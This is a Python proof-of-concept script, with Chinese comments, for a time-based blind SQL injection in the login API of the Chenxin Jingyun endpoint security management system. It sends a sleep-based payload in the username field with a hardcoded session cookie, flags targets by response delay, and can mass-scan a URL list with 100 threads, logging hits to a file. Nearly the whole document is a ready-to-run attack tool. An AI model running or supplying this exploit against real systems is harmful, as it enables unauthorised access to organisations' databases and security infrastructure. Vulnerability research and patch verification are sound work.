# 导包
import argparse  # 用于命令行参数解析
import requests  # 用于发送HTTP请求
import sys  # 用于系统相关的操作
import re  # 用于正则表达式匹配
from multiprocessing.dummy import Pool  # 用于创建线程池

# 禁用警告
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''  
  _______              _  ___        ________    __   
 / ___/ /  ___ ___    | |/_(_)__    / __/ __ \  / /   
/ /__/ _ \/ -_) _ \  _>  </ / _ \  _\ \/ /_/ / / /__  
\___/_//_/\__/_//_/ /_/|_/_/_//_/ /___/\___\_\/____/  

'''
    print(banner)

# poc模块：进行SQL注入测试
def poc(target):
    url = target + "/api/user/login"  # 设置请求URL
    headers = {
        "Cookie": "vsecureSessionID=201af681393e4cc13d30555869203394",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "102",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
    }

    # SQL注入数据
    data = "captcha:&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='"

    try:
        # 发送POST请求
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)

        # 检查响应时间以判断是否存在SQL注入
        if res.elapsed.total_seconds() >= 3:
            print(f"[+] 这个url存在SQL注入: {target}")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target} 存在SQL注入\n")
        else:
            print(f"[-] 这个url不存在SQL注入: {target}")
    except Exception as e:
        print(f"请求出现错误: {e}")

# 主函数模块
def main():
    banner()  # 打印标识信息

    # 命令行接收参数
    parser = argparse.ArgumentParser(description="这是辰信景云终端安全管理系统 login SQL注入的poc")
    #  -u 单个检测   -f 批量检测
    parser.add_argument('-u', '--url', dest='url', type=str, help="目标URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help='包含URL的文件路径')

    # 解析命令行参数
    args = parser.parse_args()

    # 判断提供的参数是单个URL还是文件
    if args.url and not args.file:
        poc(args.url)  # 调用单个URL的poc检测
    elif not args.url and args.file:
        url_list = []  # 定义要检测的URL列表
        # 从文件中读取URL
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))  # 去除换行符

        # 定义线程池大小
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print("Usage:\n\t python3 {sys.argv[0]} -h")  # 输出使用说明


# 主函数入口
if __name__ == '__main__':
    main()